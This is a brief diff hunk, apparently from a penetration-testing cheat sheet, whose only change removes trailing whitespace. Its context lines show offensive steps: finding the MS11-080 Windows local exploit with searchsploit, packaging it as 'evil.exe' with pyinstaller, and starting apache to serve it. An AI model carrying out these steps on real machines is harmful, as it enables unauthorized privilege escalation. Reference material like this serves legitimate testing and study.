@@ -365,7 +365,7 @@ cp /tmp/exploit /var/www/                                           Copy the exp
 
 searchsploit ms11-080
 cp /usr/share/exploitdb/platforms/windows/local/18176.py /tmp/
-cd /usr/share/pyinstaller/ 
+cd /usr/share/pyinstaller/
 pyinstaller -F -n evil.exe /tmp/18176.py
 cp evil.exe/dist/evil.exe /tmp/
 service apache2 start                                               Start apache
